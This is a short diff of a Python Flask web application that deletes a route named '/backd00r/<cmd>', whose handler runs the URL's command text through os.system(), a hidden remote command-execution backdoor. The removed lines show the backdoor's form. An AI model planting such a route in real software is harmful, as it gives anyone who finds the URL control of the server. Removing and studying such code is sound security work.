@@ -219,12 +219,6 @@ def show_landing():
     session['code_lang'] = "php"
     return render_template('login.html', csrf_token=session['csrf_token'])
 
-@app.route('/backd00r/<cmd>', methods=['GET'])
-@security
-def backd00r():
-    os.system(cmd)
-    """show the landing page"""
-
 @app.route('/dashboard', methods=['GET'])
 @security
 def dashboard():
